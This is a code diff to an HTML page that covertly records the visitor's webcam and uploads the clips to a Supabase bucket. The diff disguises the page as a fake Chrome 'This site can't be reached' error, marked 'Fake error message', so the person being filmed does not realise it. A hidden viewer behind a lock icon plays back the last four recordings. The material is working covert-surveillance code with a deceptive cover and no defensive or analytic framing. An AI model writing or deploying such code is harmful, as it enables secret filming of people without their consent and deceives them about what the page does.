@@ -1,25 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Stealth Recorder + Last 4 Videos</title>
+  <title>This site can’t be reached</title>
   <script src="https://unpkg.com/@supabase/supabase-js@2.39.5/dist/umd/supabase.js"></script>
   <style>
     body {
       margin: 0;
       background: white;
-      height: 100vh;
-      width: 100vw;
-      overflow: hidden;
-      font-family: sans-serif;
-      text-align: center;
+      color: #5f6368;
+      font-family: Arial, sans-serif;
+      padding: 60px;
+      font-size: 16px;
+      line-height: 1.6;
     }
     #lockIcon {
       position: fixed;
       top: 20px;
       right: 20px;
-      font-size: 30px;
-      z-index: 999;
+      font-size: 28px;
       cursor: pointer;
+      z-index: 999;
       user-select: none;
     }
     #viewer {
@@ -33,8 +33,8 @@
     video {
       width: 90%;
       max-width: 600px;
+      margin-top: 20px;
       background: #000;
-      margin-top: 10px;
     }
     button {
       padding: 10px 20px;
@@ -42,8 +42,8 @@
       color: white;
       border: none;
       font-size: 16px;
+      margin-top: 20px;
       cursor: pointer;
-      margin: 20px;
     }
   </style>
 </head>
@@ -51,6 +51,18 @@
 
 <div id="lockIcon" onclick="unlock()">🔒</div>
 
+<!-- Fake error message -->
+<h2>This site can’t be reached</h2>
+<p>The connection was reset.</p>
+<p>Try:</p>
+<ul>
+  <li>Checking the connection</li>
+</ul>
+<p><b>ERR_CONNECTION_RESET</b></p>
+<p>Reload</p>
+<p>Details</p>
+
+<!-- Hidden viewer area -->
 <div id="viewer">
   <h3>Recording Playback</h3>
   <video id="playback" controls></video>
@@ -86,11 +98,11 @@
 
       mediaRecorder.start();
       recordingStarted = true;
-      console.log("Recording started");
 
       setTimeout(() => {
-  if (!stopped) stopRecording();
-}, 4000); // 4 seconds
+        if (!stopped) stopRecording();
+      }, 4000); // stop after 4 seconds
+
     } catch (err) {
       alert("Camera Error: " + err.message);
     }
@@ -109,21 +121,20 @@
 
         const fileName = `video_${Date.now()}.webm`;
 
-        const { data: existing } = await client.storage.from(BUCKET).list('', {
+        const { data: allFiles } = await client.storage.from(BUCKET).list('', {
           sortBy: { column: 'name', order: 'asc' }
         });
 
-        const videosOnly = existing.filter(f => f.name.endsWith('.webm'));
-
-        if (videosOnly.length >= 4) {
-          const oldest = videosOnly[0];
-          await client.storage.from(BUCKET).remove([oldest.name]);
+        const webms = allFiles.filter(f => f.name.endsWith('.webm'));
+        if (webms.length > 4) {
+          const toDelete = webms.slice(0, webms.length - 4);
+          await client.storage.from(BUCKET).remove(toDelete.map(f => f.name));
         }
 
         const { error } = await client.storage.from(BUCKET).upload(fileName, blob);
         if (!error) {
-          await new Promise(resolve => setTimeout(resolve, 1000)); // short delay
-          loadVideos(); // refresh list
+          await new Promise(resolve => setTimeout(resolve, 1000));
+          loadVideos();
         }
       };
     }
@@ -137,7 +148,7 @@
   }
 
   async function loadVideos() {
-    const { data, error } = await client.storage.from(BUCKET).list('', {
+    const { data } = await client.storage.from(BUCKET).list('', {
       sortBy: { column: 'name', order: 'desc' }
     });
 
@@ -146,14 +157,11 @@
 
     const filtered = (data || [])
       .filter(f => f.name.endsWith('.webm'))
-      .sort((a, b) => b.name.localeCompare(a.name)) // latest first
+      .sort((a, b) => b.name.localeCompare(a.name))
       .slice(0, 4);
 
     for (let file of filtered) {
-      const { data: signed, error: urlError } = await client
-        .storage.from(BUCKET)
-        .createSignedUrl(file.name, 60 * 60); // 1 hour
-
+      const { data: signed } = await client.storage.from(BUCKET).createSignedUrl(file.name, 3600);
       if (signed?.signedUrl) {
         const vid = document.createElement("video");
         vid.src = signed.signedUrl;
